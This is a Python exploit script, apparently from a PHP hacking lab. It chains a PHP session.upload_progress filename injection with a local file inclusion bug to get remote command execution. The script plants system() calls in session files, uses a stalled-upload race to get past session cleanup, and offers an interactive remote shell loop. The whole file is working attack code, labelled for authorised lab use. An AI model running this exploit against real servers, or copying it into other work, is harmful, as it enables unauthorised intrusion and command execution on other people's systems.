#!/usr/bin/env python3
"""
Chain A — session.upload_progress filename injection + LFI → command execution.
Lab defaults match php2shell-lab-vtbw (FPM, /var/lib/php/sessions, index.php?page=).
Based on ikow/php2shell-poc (authorized lab use only).
"""
import argparse
import socket
import sys
import time
import uuid


def inject_session(host, port, path, sid, php_code, boundary="AAABBBCCC"):
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="'
        + php_code.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def inject_session_stalled(host, port, path, sid, php_code,
                           boundary="AAABBBCCC", timeout=15):
    prefix = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="'
        + php_code.encode("latin-1") + b'"\r\n\r\n'
    )
    first = prefix + b"Z" * 5120
    content_length = len(first) + 100000
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {content_length}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + first
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.sendall(req)
    return sock


def trigger_lfi(host, port, lfi_path, session_file, sid):
    url = f"{lfi_path}?page={session_file}"
    req = (
        f"GET {url} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def run_rce(host, port, command, cleanup_on=True, delay=0.08, attempts=5,
            inject_path="/index.php", lfi_path="/index.php",
            session_path="/var/lib/php/sessions", sid=""):
    cmd = command.replace("'", "'\"'\"'")
    php_code = f"<?php echo '___START___'; system('{cmd}'); echo '___END___';?>"

    for attempt in range(1, attempts + 1):
        use_sid = sid or ("exploit" + uuid.uuid4().hex[:20])
        session_file = f"{session_path}/sess_{use_sid}"
        stalled = None
        try:
            if cleanup_on:
                stalled = inject_session_stalled(
                    host, port, inject_path, use_sid, php_code)
                time.sleep(delay)
                status1 = "stalled"
            else:
                resp1 = inject_session(host, port, inject_path, use_sid, php_code)
                status1 = (resp1.split(b"\r\n", 1)[0].decode("latin1", "replace")
                           if resp1 else "NO RESPONSE")
            resp2 = trigger_lfi(host, port, lfi_path, session_file, use_sid)
            body = (resp2.split(b"\r\n\r\n", 1)[-1]
                    if b"\r\n\r\n" in resp2 else resp2)
            if b"___START___" in body and b"___END___" in body:
                start = body.index(b"___START___") + len(b"___START___")
                end = body.index(b"___END___")
                return True, body[start:end].decode("latin1", "replace").strip(), use_sid
            if attempt == attempts:
                status2 = (resp2.split(b"\r\n", 1)[0].decode("latin1", "replace")
                           if resp2 else "NO RESPONSE")
                return False, f"plant={status1} lfi={status2} body={body[:200]!r}", use_sid
        finally:
            if stalled is not None:
                stalled.close()
        time.sleep(0.05)
    return False, "exhausted attempts", sid or ""


def main():
    ap = argparse.ArgumentParser(description="Chain A: session injection + LFI (lab)")
    ap.add_argument("-t", "--host", default="target")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("--command", "-c", default="id")
    ap.add_argument("--inject-path", default="/index.php")
    ap.add_argument("--lfi-path", default="/index.php")
    ap.add_argument("--session-path", default="/var/lib/php/sessions")
    ap.add_argument("--no-cleanup-on", action="store_true",
                    help="disable stalled-upload race (cleanup=On labs need default)")
    ap.add_argument("--shell", action="store_true",
                    help="interactive command loop (lab only)")
    ap.add_argument("--attempts", type=int, default=5)
    args = ap.parse_args()

    cleanup_on = not args.no_cleanup_on

    if args.shell:
        if not sys.stdin.isatty():
            print("[!] Kein interaktives Terminal (stdin ist keine TTY).", file=sys.stderr)
            print("    In einem normalen Terminal:", file=sys.stderr)
            print("      ~/Schreibtisch/cursor-projects/vtbw-php2shell-lab shell", file=sys.stderr)
            print("    oder:", file=sys.stderr)
            print("      python3 attacker/scripts/chain_a_session_lfi.py -t 127.0.0.1 -p 19281 --shell",
                  file=sys.stderr)
            return 1
        print(f"[*] Chain A lab shell → {args.host}:{args.port}")
        print("[*] Jeder Befehl = neuer HTTP-Exploit (~1s). Beenden: quit oder Ctrl-D")
        while True:
            try:
                line = input("www-data$ ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if line in ("quit", "exit", "q"):
                break
            if not line:
                continue
            try:
                ok, out, _sid = run_rce(
                    args.host, args.port, line, cleanup_on=cleanup_on,
                    attempts=args.attempts,
                    inject_path=args.inject_path, lfi_path=args.lfi_path,
                    session_path=args.session_path,
                )
            except (ConnectionRefusedError, OSError) as e:
                print(f"[-] Keine Verbindung zu {args.host}:{args.port} — {e}")
                print("    Lab läuft?  ~/Schreibtisch/cursor-projects/vtbw-php2shell-lab up")
                continue
            if ok:
                print(out)
            else:
                print(f"[-] {out}")
        return 0

    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Command: {args.command}")
    ok, out, sid = run_rce(
        args.host, args.port, args.command, cleanup_on=cleanup_on,
        attempts=args.attempts,
        inject_path=args.inject_path, lfi_path=args.lfi_path,
        session_path=args.session_path,
    )
    if ok:
        print(f"[+] RCE (Chain A): {out}")
        print(f"    sid={sid}")
        return 0
    print(f"[-] {out}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
